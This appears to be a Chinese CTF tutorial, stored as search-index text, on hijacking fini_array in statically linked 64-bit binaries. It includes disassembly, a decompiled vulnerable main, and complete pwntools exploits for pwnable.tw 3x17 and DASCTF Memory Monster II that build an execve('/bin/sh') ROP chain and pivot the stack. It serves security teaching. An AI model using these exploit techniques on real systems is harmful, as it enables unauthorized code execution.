\u4f4d\u4f20\u53c2\u7279\u5b9a\u5f97\u51fa\u5bf9\u5e94\u5bc4\u5b58\u5668\u503c\u3002\u8fd9\u4e2a\u6267\u884c\u987a\u5e8f\u6211\u662f\u901a\u8fc7\u8c03\u8bd5\u5f97\u51fa\u6765\u7684\u3002\uff08__libc_csu_init \u7684\u8bdd\u662f ret2csu \u5229\u7528\u5bf9\u8c61\u3002\uff09 rdi <- main rcx <- __libc_csu_init //\u5728main\u51fd\u6570\u524d\u6267\u884c r8 <- __libc_csu_fini //\u5728main\u51fd\u6570\u540e\u6267\u884c __libc_csu_fini \u51fd\u6570 \u00b6 __libc_csu_fini \u51fd\u6570\u662f main \u51fd\u6570\u9000\u51fa\u8fd4\u56de\u5230 __libc_start_main \u540e\uff0c\u901a\u8fc7 __libc_start_main \u8c03\u7528\u7684\u3002\u5177\u4f53\u770b\u770b\u51fd\u6570\uff1a . text : 0000000000402 960 __libc_csu_fini proc near ; DATA XREF : start + F \u2191 o . text : 0000000000402 960 ; __unwind { . text : 0000000000402 960 push rbp . text : 0000000000402 961 lea rax , unk_4B4100 . text : 0000000000402 968 lea rbp , _fini_array_0 . text : 000000000040296F push rbx . text : 0000000000402 970 sub rax , rbp . text : 0000000000402 973 sub rsp , 8 . text : 0000000000402 977 sar rax , 3 . text : 0000000000402 97 B jz short loc_402996 . text : 0000000000402 97 D lea rbx , [ rax -1 ] . text : 0000000000402 981 nop dword ptr [ rax + 00000000 h ] . text : 0000000000402 988 . text : 0000000000402 988 loc_402988 : ; CODE XREF : __libc_csu_fini + 34 \u2193 j . text : 0000000000402 988 call qword ptr [ rbp + rbx * 8 + 0 ] . text : 0000000000402 98 C sub rbx , 1 . text : 0000000000402 990 cmp rbx , 0F FFFFFFFFFFFFFFFh . text : 0000000000402 994 jnz short loc_402988 . text : 0000000000402 996 . text : 0000000000402 996 loc_402996 : ; CODE XREF : __libc_csu_fini + 1 B \u2191 j . text : 0000000000402 996 add rsp , 8 . text : 0000000000402 99 A pop rbx . text : 0000000000402 99 B pop rbp . text : 0000000000402 99 C jmp sub_48E32C . text : 0000000000402 99 C ; } // starts at 402960 . text : 0000000000402 99 C __libc_csu_fini endp \u6ce8\u610f\u4ee5\u4e0b\u8fd9\u4e09\u884c\u6e90\u7801\uff0c\u662f\u52ab\u6301 fini_array \u5b9e\u73b0\u65e0\u9650\u5199\u8fdb\u884c ROP \u7684\u5173\u952e\uff1a //\u5c06 fini_array[0] \u7684\u503c\u52a0\u8f7d\u5230 rbp . text : 0000000000402 968 lea rbp , _fini_array_0 //\u7ecf\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\u540e\uff0c\u8fd9\u91cc\u4f1a call fini_array[1] \uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u5b58\u50a8\u5728 fini_array[1] \u7684\u6307\u9488 . text : 0000000000402 988 call qword ptr [ rbp + rbx * 8 + 0 ] //\u8c03\u7528\u5b8c fini_array[1] \u4e4b\u540e\u518d\u6b21\u8fdb\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\uff0c\u8fd9\u91cc\u4f1a call fini_array[0] . text : 0000000000402 988 call qword ptr [ rbp + rbx * 8 + 0 ] \u770b\u4e00\u4e0b fini_array \u7684\u4ee3\u7801\uff1a . fini_array : 00000000004 B40F0 _fini_array segment para public ' DATA ' use64 . fini_array : 00000000004 B40F0 assume cs : _fini_array . fini_array : 00000000004 B40F0 ; org 4 B40F0h . fini_array : 00000000004 B40F0 _fini_array_0 dq offset sub_401B00 ; DATA XREF : . text : 0000000000402 91 C \u2191 o . fini_array : 00000000004 B40F0 ; __libc_csu_fini + 8 \u2191 o . fini_array : 00000000004 B40F8 dq offset sub_401580 . fini_array : 00000000004 B40F8 _fini_array ends \u8fd9\u91cc\u660e\u786e\u77e5\u9053\u4e86 fini_array \u91cc\u9762\u5b58\u50a8\u4e86\u4e24\u4e2a\u6307\u9488\uff0c\u8c03\u7528\u987a\u5e8f\u4e3a\uff1a\u5148 fini_array[1] \uff0c\u518d fini_array[0] \u3002\u90a3\u4e48**\u5982\u679c\u6211\u4eec\u628a fini_array[1] \u8986\u76d6\u4e3a\u51fd\u6570 A \u7684\u5730\u5740\uff0cfini_array[0] \u8986\u76d6\u4e3a __libc_csu_fini \u7684\u5730\u5740 **\uff0c\u5f53\u9000\u51fa main \u540e\uff0c\u7a0b\u5e8f\u4f1a\u8fd9\u6837\uff1a __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini ...... \u8fd9\u4e2a\u5faa\u73af\u5c31\u4f1a\u4e00\u76f4\u6301\u7eed\u5230 fini_array[0] \u88ab\u8986\u76d6\u4e3a\u5176\u4ed6\u503c\u3002 \u8fd8\u6709\u4e2a\u70b9\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u6e90\u7801\u4e2d\u7684 lea rbp, _fini_array_0 \uff0c\u5c06 rbp \u7684\u503c\u4fee\u6539\u4e3a fini_array[0] \u6240\u5728\u7684\u5730\u5740\uff0c\u90a3\u4e48\u914d\u5408 leave|ret \u5c31\u80fd\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10 \u7684\u5730\u5740\uff0c\u6211\u4eec\u5c31\u5c06\u5229\u7528\u51fd\u6570\u653e\u5728\u8fd9\u4e2a\u5730\u65b9\u3002 pwnable.tw-3x17 \u00b6 \u4fdd\u62a4\u60c5\u51b5 \u00b6 \u9759\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff1a skye:~/CTF\u5b66\u4e60/fini_array\u52ab\u6301$ file 317 317 : ELF 64 -bit LSB executable, x86-64, version 1 ( GNU/Linux ) , statically linked, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5**\u662f\u6709 canary \u4fdd\u62a4**\u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u6f0f\u6d1e\u51fd\u6570 \u00b6 \u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6216\u8005\u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\u4f4d\u7f6e\uff08shift+F12\uff09\u3002 main \u51fd\u6570\u4e2d\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u5165 0x18 \u7684\u529f\u80fd\uff1a //\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\u540d int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int result ; // eax char * v4 ; // ST08_8 char buf ; // [rsp+10h] [rbp-20h] unsigned __int64 v6 ; // [rsp+28h] [rbp-8h] v6 = __readfsqword ( 0x28u ); result = ( unsigned __int8 ) ++ byte_4B9330 ; if ( byte_4B9330 == 1 ) { write_fun ( 1u , \"addr:\" , 5uLL ); read_fun ( 0 , & buf , 0x18uLL ); //\u8bfb\u53d6\u5730\u5740 v4 = ( char * )( signed int ) sub_40EE70 (( __int64 ) & buf ); write_fun ( 1u , \"data:\" , 5uLL ); read_fun ( 0 , v4 , 0x18uLL ); //\u5411\u8bfb\u53d6\u5730\u5740\u5199\u5165\u5185\u5bb9 result = 0 ; } if ( __readfsqword ( 0x28u ) != v6 ) sub_44A3E0 (); return result ; } \u601d\u8def \u00b6 \u8fd9\u6761\u9898\u76ee\u8fd8\u6709\u5176\u4ed6\u89e3\u6cd5\uff0c\u56e0\u4e3a\u7528\u8fd9\u6761\u9898\u76ee\u5b66\u4e60 **fini_array \u52ab\u6301**\u5c31\u8bb0\u5f55\u8fd9\u79cd\u505a\u6cd5\u3002\u5176\u4ed6\u89e3\u6cd5\uff1a pwnable.tw_3x17 \u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u53ea\u80fd\u7528\u5b83\u7684\u6709\u4e1c\u897f getshell \u3002\u5199 shellcode \u4f30\u8ba1\u8981 mprotect \u7ed9\u5185\u5bb9\u52a0\u4e0a\u8fd0\u884c\u6743\u9650\u7ed5\u8fc7 NX \u4fdd\u62a4\uff1b\u5199\u4e2a\u7cfb\u7edf\u8c03\u7528\u53f7\u53ef\u884c\u4e00\u70b9\u3002 \u90a3\u5c31\u9700\u8981\u7528\u5230\u5199\u5165\u529f\u80fd\u51fd\u6570\u4e86\uff0c\u5982\u679c\u9700\u8981\u7b26\u5408\u672c\u6587\u5b66\u4e60\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u51fd\u6570\uff0c\u521a\u597d main \u51fd\u6570\u5c31\u662f\u3002\u73b0\u5728\u660e\u786e\u601d\u8def\uff1a \u5c06 fini_array[1] \u8986\u76d6\u4e3a main \u51fd\u6570\u5730\u5740\uff1bfini_array[0] \u8986\u76d6\u4e3a __libc_start_fini \u5730\u5740\uff1b \u4f9d\u6b21\u5411 fini_array + 0x10 \u5199\u5165\u7cfb\u7edf\u8c03\u7528\u53f7\u5229\u7528\u4ee3\u7801\uff1b \u5199\u5165\u5b8c\u6210\u540e\uff0c\u5c06 fini_array[0] \u8986\u76d6\u4e3a leave|ret \uff0c\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10; \u6784\u5efa\u7684\u7cfb\u7edf\u8c03\u7528\u547d\u4ee4\uff1asyscall(0x3b,addr_of_binsh,0,0) \u76f8\u5f53\u4e8e\uff1aexecve(addr_of_binsh,0,0) \u7cfb\u7edf\u8c03\u7528\u53f7\u67e5\u8be2\uff1a https://www.mrskye.cn/archives/168/ exp \u00b6 from pwn import * context . log_level = 'debug' #p = process(\"./317\") p = remote ( \"chall.pwnable.tw\" , 10105 ) elf = process ( \"./317\" ) fini_array = 0x4B40F0 main_addr = 0x401B6D libc_csu_fini = 0x402960 esp = fini_array + 0x10 leave_ret = 0x401C4B ret = 0x401016 rop_syscall = 0x471db5 rop_pop_rax = 0x41e4af rop_pop_rdx = 0x446e35 rop_pop_rsi = 0x406c30 rop_pop_rdi = 0x401696 bin_sh_addr = 0x4B419A def write ( addr , data ): p . recv () p . send ( str ( addr )) p . recv () p . send ( data ) def exp (): # hijack fini_array #gdb.attach(p) write ( fini_array , p64 ( libc_csu_fini ) + p64 ( main_addr )) # rop chain write ( bin_sh_addr , \"/bin/sh \\x00 \" ) write ( esp , p64 ( rop_pop_rax )) write ( esp + 8 , p64 ( 0x3b )) write ( esp + 16 , p64 ( rop_pop_rdi )) write ( esp + 24 , p64 ( bin_sh_addr )) write ( esp + 32 , p64 ( rop_pop_rdx )) write ( esp + 40 , p64 ( 0 )) write ( esp + 48 , p64 ( rop_pop_rsi )) write ( esp + 56 , p64 ( 0 )) write ( esp + 64 , p64 ( rop_syscall )) # stack pivoting write ( fini_array , p64 ( leave_ret ) + p64 ( ret )) if __name__ == '__main__' : exp () p . interactive () \u53c2\u8003\u6587\u7ae0 \u00b6 [\u539f\u521b]pwnable.tw\u65b0\u624b\u5411write up(\u4e8c) 3\u00d717-x64\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301 Memory Monster II \u00b6 \u9898\u76ee\u6765\u6e90 DASCTF \u4e94\u6708\u8d5b\uff0c\u4f5c\u8005\u4e3a TaQini \uff0c \u9644\u4ef6 \u8fd9\u91cc\u548c\u4e0a\u9762\u90a3\u6761\u673a\u4f1a\u4e00\u6837\uff0c\u4e0b\u9762\u662f\u72ec\u7acb\u5b8c\u6210\uff0c\u8be6\u7ec6\u8bb0\u5f55\u4e00\u4e0b \u4fdd\u62a4\u60c5\u51b5 \u00b6 checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5**\u662f\u6709 canary \u4fdd\u62a4**\u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u6f0f\u6d1e\u51fd\u6570 \u00b6 \u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6ca1\u6709\u5375\u7528\u53ea\u4fee\u590d\u4e86\u4e24\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u80fd\u770b\u5230 _start \u51fd\u6570\uff1a\uff08\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\uff09 . text : 0000000000401 B00 public start . text : 0000000000401 B00 start proc near ; DATA XREF : LOAD : 000000000040001 8 \u2191 o . text : 0000000000401 B00 ; __unwind { . text : 0000000000401 B00 xor ebp , ebp . text : 0000000000401 B02 mov r9 , rdx . text : 0000000000401 B05 pop rsi . text : 0000000000401 B06 mov rdx , rsp . text : 0000000000401 B09 and rsp , 0F FFFFFFFFFFFFFF0h . text : 0000000000401 B0D push rax . text : 0000000000401 B0E push rsp . text : 0000000000401 B0F mov r8 , offset __libc_start_fini . text : 0000000000401 B16 mov rcx , offset __libc_start_init . text : 0000000000401 B1D mov rdi , offset main . text : 0000000000401 B24 db 67 h . text : 0000000000401 B24 call sub_4020B0 . text : 0000000000401 B2A hlt . text : 0000000000401 B2A ; } // starts at 401B00 . text : 0000000000401 B2A start endp \u4f9d\u636e\u89c4\u5f8b\u77e5\u9053\u4e09\u4e2a mov \u4f9d\u6b21\u662f\u5904\u7406 __libc_start_fini\u3001__libc_start_init\u3001main \u3002\u4ece\u8fd9\u91cc\u83b7\u53d6\u5230\u5173\u952e\u53c2\u6570\uff1a __libc_start_fini\u3001main \u5730\u5740\u3002 \u7136\u540e gdb \u8c03\u8bd5\uff0c\u65ad\u70b9\u6253\u5728 __libc_start_fini \uff0c\u4e00\u76f4\u8fd0\u884c\u5230 call \u6307\u4ee4\uff0crbp \u5b58\u50a8\u7684\u503c\u5c31\u662f fini_array[0] \u7684\u5730\u5740 0x4b80b0 \uff1a leave_ret \u548c ret \u901a\u8fc7 ROPgadget \u76f4\u63a5\u80fd\u67e5\u5230\uff1brax\u3001rdi\u3001rsi\u3001rdx \u4f20\u53c2 gadget \u4e5f\u80fd\u627e\u5230\uff0c\u8fd9\u51e0\u4e2a gadget \u627e\u90a3\u79cd\u53ea\u7a7f\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\uff1a pop rax;ret \u3002 exp \u00b6 from pwn import * context . log_level = 'debug' p = process ( \"./main\" ) elf = ELF ( \"./main\" ) #hijack fini libc_csu_fini = 0x0402CB0 main_addr = 0x0401C1D fini_array = 0x4b80b0 esp = fini_array + 0x10 leave_ret = 0x0401cf3 ret = 0x0401016 #execve('/bin/sh',0,0) rop_syscall = 0x46F745 rop_pop_rax = 0x0000000000448fcc rop_pop_rdx = 0x0000000000448415 rop_pop_rsi = 0x0000000000406f80 rop_pop_rdi = 0x0000000000401746 bin_sh_addr = 0x492895 def write ( addr , data ): p . sendlineafter ( 'addr:' , p64 ( addr )) p . sendafter ( 'data:' , data ) # hijack fini_array gdb . attach ( p , 'b *0x0402CB0' ) write ( fini_array , p64 ( libc_csu_fini ) + p64 ( main_addr )) # rop chain write ( esp , p64 ( rop_pop_rax )) write ( esp + 8 , p64 ( 0x3b )) write ( esp + 16 , p64 ( rop_pop_rdi )) write ( esp + 24 , p64 ( bin_sh_addr )) write ( esp + 32 , p64 ( rop_pop_rdx )) write ( esp + 40 , p64 ( 0 )) write ( esp + 48 , p64 ( rop_pop_rsi )) write ( esp + 56 , p64 ( 0 )) write ( esp + 64 , p64 ( rop_syscall )) # stack pivoting #gdb.attach(p) write ( fini_array , p64 ( leave_ret ) + p64 ( ret )) p . interactive () \u53c2\u8003\u6587\u7ae0 \u00b6 \u8be6\u89e364\u4f4d\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301\u53caROP\u653b\u51fb","title":"fini_array\u52ab\u6301"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#64-fini_array-rop","text":"","title":"\u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_1","text":"\u7a0b\u5e8f\u7684\u542f\u52a8\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u770b\u5230 main \u51fd\u6570\u4e0d\u662f\u7a0b\u5e8f\u8d77\u70b9\uff0c\u4e4b\u524d\u5199\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u4e5f\u5206\u6790\u8fc7 text \u6bb5\u8d77\u70b9\u662f _start \u51fd\u6570 \u3002_start \u51fd\u6570\u8c03\u7528__libc_start_main \u5b8c\u6210\u542f\u52a8\u548c\u9000\u51fa\u5de5\u4f5c\u3002\u5177\u4f53\u770b\u770b _start \u51fd\u6570\uff1a . text : 0000000000401 A60 public start . text : 0000000000401 A60 start proc near ; DATA XREF : LOAD : 000000000040001 8 \u2191 o . text : 0000000000401 A60 ; __unwind { . text : 0000000000401 A60 xor ebp , ebp . text : 0000000000401 A62 mov r9 , rdx . text : 0000000000401 A65 pop rsi . text : 0000000000401 A66 mov rdx , rsp . text : 0000000000401 A69 and rsp , 0F FFFFFFFFFFFFFF0h . text : 0000000000401 A6D push rax . text : 0000000000401 A6E push rsp // \u4ee5\u6b64\u5c06 fini\u3001init\u3001main \u5730\u5740\u538b\u5165\u5bc4\u5b58\u5668 . text : 0000000000401 A6F mov r8 , offset sub_402BD0 ; fini . text : 0000000000401 A76 mov rcx , offset loc_402B40 ; init . text : 0000000000401 A7D mov rdi , offset main . text : 0000000000401 A84 db 67 h . text : 0000000000401 A84 call __libc_start_main . text : 0000000000401 A8A hlt . text : 0000000000401 A8A ; } // starts at 401A60 . text : 0000000000401 A8A start endp __libc_start_main \u5b9a\u4e49\u539f\u578b \uff1a int __libc_start_main ( int ( * main ) ( int , char ** , char ** ), int argc , char ** ubp_av , void ( * init ) ( void ), void ( * fini ) ( void ), void ( * rtld_fini ) ( void ), void ( * stack_end )); \u6839\u636e 64 \u4f4d\u4f20\u53c2\u7279\u5b9a\u5f97\u51fa\u5bf9\u5e94\u5bc4\u5b58\u5668\u503c\u3002\u8fd9\u4e2a\u6267\u884c\u987a\u5e8f\u6211\u662f\u901a\u8fc7\u8c03\u8bd5\u5f97\u51fa\u6765\u7684\u3002\uff08__libc_csu_init \u7684\u8bdd\u662f ret2csu \u5229\u7528\u5bf9\u8c61\u3002\uff09 rdi <- main rcx <- __libc_csu_init //\u5728main\u51fd\u6570\u524d\u6267\u884c r8 <- __libc_csu_fini //\u5728main\u51fd\u6570\u540e\u6267\u884c","title":"\u7a0b\u5e8f\u8d77\u70b9"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#__libc_csu_fini","text":"__libc_csu_fini \u51fd\u6570\u662f main \u51fd\u6570\u9000\u51fa\u8fd4\u56de\u5230 __libc_start_main \u540e\uff0c\u901a\u8fc7 __libc_start_main \u8c03\u7528\u7684\u3002\u5177\u4f53\u770b\u770b\u51fd\u6570\uff1a . text : 0000000000402 960 __libc_csu_fini proc near ; DATA XREF : start + F \u2191 o . text : 0000000000402 960 ; __unwind { . text : 0000000000402 960 push rbp . text : 0000000000402 961 lea rax , unk_4B4100 . text : 0000000000402 968 lea rbp , _fini_array_0 . text : 000000000040296F push rbx . text : 0000000000402 970 sub rax , rbp . text : 0000000000402 973 sub rsp , 8 . text : 0000000000402 977 sar rax , 3 . text : 0000000000402 97 B jz short loc_402996 . text : 0000000000402 97 D lea rbx , [ rax -1 ] . text : 0000000000402 981 nop dword ptr [ rax + 00000000 h ] . text : 0000000000402 988 . text : 0000000000402 988 loc_402988 : ; CODE XREF : __libc_csu_fini + 34 \u2193 j . text : 0000000000402 988 call qword ptr [ rbp + rbx * 8 + 0 ] . text : 0000000000402 98 C sub rbx , 1 . text : 0000000000402 990 cmp rbx , 0F FFFFFFFFFFFFFFFh . text : 0000000000402 994 jnz short loc_402988 . text : 0000000000402 996 . text : 0000000000402 996 loc_402996 : ; CODE XREF : __libc_csu_fini + 1 B \u2191 j . text : 0000000000402 996 add rsp , 8 . text : 0000000000402 99 A pop rbx . text : 0000000000402 99 B pop rbp . text : 0000000000402 99 C jmp sub_48E32C . text : 0000000000402 99 C ; } // starts at 402960 . text : 0000000000402 99 C __libc_csu_fini endp \u6ce8\u610f\u4ee5\u4e0b\u8fd9\u4e09\u884c\u6e90\u7801\uff0c\u662f\u52ab\u6301 fini_array \u5b9e\u73b0\u65e0\u9650\u5199\u8fdb\u884c ROP \u7684\u5173\u952e\uff1a //\u5c06 fini_array[0] \u7684\u503c\u52a0\u8f7d\u5230 rbp . text : 0000000000402 968 lea rbp , _fini_array_0 //\u7ecf\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\u540e\uff0c\u8fd9\u91cc\u4f1a call fini_array[1] \uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u5b58\u50a8\u5728 fini_array[1] \u7684\u6307\u9488 . text : 0000000000402 988 call qword ptr [ rbp + rbx * 8 + 0 ] //\u8c03\u7528\u5b8c fini_array[1] \u4e4b\u540e\u518d\u6b21\u8fdb\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\uff0c\u8fd9\u91cc\u4f1a call fini_array[0] . text : 0000000000402 988 call qword ptr [ rbp + rbx * 8 + 0 ] \u770b\u4e00\u4e0b fini_array \u7684\u4ee3\u7801\uff1a . fini_array : 00000000004 B40F0 _fini_array segment para public ' DATA ' use64 . fini_array : 00000000004 B40F0 assume cs : _fini_array . fini_array : 00000000004 B40F0 ; org 4 B40F0h . fini_array : 00000000004 B40F0 _fini_array_0 dq offset sub_401B00 ; DATA XREF : . text : 0000000000402 91 C \u2191 o . fini_array : 00000000004 B40F0 ; __libc_csu_fini + 8 \u2191 o . fini_array : 00000000004 B40F8 dq offset sub_401580 . fini_array : 00000000004 B40F8 _fini_array ends \u8fd9\u91cc\u660e\u786e\u77e5\u9053\u4e86 fini_array \u91cc\u9762\u5b58\u50a8\u4e86\u4e24\u4e2a\u6307\u9488\uff0c\u8c03\u7528\u987a\u5e8f\u4e3a\uff1a\u5148 fini_array[1] \uff0c\u518d fini_array[0] \u3002\u90a3\u4e48**\u5982\u679c\u6211\u4eec\u628a fini_array[1] \u8986\u76d6\u4e3a\u51fd\u6570 A \u7684\u5730\u5740\uff0cfini_array[0] \u8986\u76d6\u4e3a __libc_csu_fini \u7684\u5730\u5740 **\uff0c\u5f53\u9000\u51fa main \u540e\uff0c\u7a0b\u5e8f\u4f1a\u8fd9\u6837\uff1a __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini ...... \u8fd9\u4e2a\u5faa\u73af\u5c31\u4f1a\u4e00\u76f4\u6301\u7eed\u5230 fini_array[0] \u88ab\u8986\u76d6\u4e3a\u5176\u4ed6\u503c\u3002 \u8fd8\u6709\u4e2a\u70b9\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u6e90\u7801\u4e2d\u7684 lea rbp, _fini_array_0 \uff0c\u5c06 rbp \u7684\u503c\u4fee\u6539\u4e3a fini_array[0] \u6240\u5728\u7684\u5730\u5740\uff0c\u90a3\u4e48\u914d\u5408 leave|ret \u5c31\u80fd\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10 \u7684\u5730\u5740\uff0c\u6211\u4eec\u5c31\u5c06\u5229\u7528\u51fd\u6570\u653e\u5728\u8fd9\u4e2a\u5730\u65b9\u3002","title":"__libc_csu_fini \u51fd\u6570"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#pwnabletw-3x17","text":"","title":"pwnable.tw-3x17"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_2","text":"\u9759\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff1a skye:~/CTF\u5b66\u4e60/fini_array\u52ab\u6301$ file 317 317 : ELF 64 -bit LSB executable, x86-64, version 1 ( GNU/Linux ) , statically linked, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5**\u662f\u6709 canary \u4fdd\u62a4**\u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 )","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_3","text":"\u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6216\u8005\u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\u4f4d\u7f6e\uff08shift+F12\uff09\u3002 main \u51fd\u6570\u4e2d\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u5165 0x18 \u7684\u529f\u80fd\uff1a //\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\u540d int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int result ; // eax char * v4 ; // ST08_8 char buf ; // [rsp+10h] [rbp-20h] unsigned __int64 v6 ; // [rsp+28h] [rbp-8h] v6 = __readfsqword ( 0x28u ); result = ( unsigned __int8 ) ++ byte_4B9330 ; if ( byte_4B9330 == 1 ) { write_fun ( 1u , \"addr:\" , 5uLL ); read_fun ( 0 , & buf , 0x18uLL ); //\u8bfb\u53d6\u5730\u5740 v4 = ( char * )( signed int ) sub_40EE70 (( __int64 ) & buf ); write_fun ( 1u , \"data:\" , 5uLL ); read_fun ( 0 , v4 , 0x18uLL ); //\u5411\u8bfb\u53d6\u5730\u5740\u5199\u5165\u5185\u5bb9 result = 0 ; } if ( __readfsqword ( 0x28u ) != v6 ) sub_44A3E0 (); return result ; }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_4","text":"\u8fd9\u6761\u9898\u76ee\u8fd8\u6709\u5176\u4ed6\u89e3\u6cd5\uff0c\u56e0\u4e3a\u7528\u8fd9\u6761\u9898\u76ee\u5b66\u4e60 **fini_array \u52ab\u6301**\u5c31\u8bb0\u5f55\u8fd9\u79cd\u505a\u6cd5\u3002\u5176\u4ed6\u89e3\u6cd5\uff1a pwnable.tw_3x17 \u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u53ea\u80fd\u7528\u5b83\u7684\u6709\u4e1c\u897f getshell \u3002\u5199 shellcode \u4f30\u8ba1\u8981 mprotect \u7ed9\u5185\u5bb9\u52a0\u4e0a\u8fd0\u884c\u6743\u9650\u7ed5\u8fc7 NX \u4fdd\u62a4\uff1b\u5199\u4e2a\u7cfb\u7edf\u8c03\u7528\u53f7\u53ef\u884c\u4e00\u70b9\u3002 \u90a3\u5c31\u9700\u8981\u7528\u5230\u5199\u5165\u529f\u80fd\u51fd\u6570\u4e86\uff0c\u5982\u679c\u9700\u8981\u7b26\u5408\u672c\u6587\u5b66\u4e60\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u51fd\u6570\uff0c\u521a\u597d main \u51fd\u6570\u5c31\u662f\u3002\u73b0\u5728\u660e\u786e\u601d\u8def\uff1a \u5c06 fini_array[1] \u8986\u76d6\u4e3a main \u51fd\u6570\u5730\u5740\uff1bfini_array[0] \u8986\u76d6\u4e3a __libc_start_fini \u5730\u5740\uff1b \u4f9d\u6b21\u5411 fini_array + 0x10 \u5199\u5165\u7cfb\u7edf\u8c03\u7528\u53f7\u5229\u7528\u4ee3\u7801\uff1b 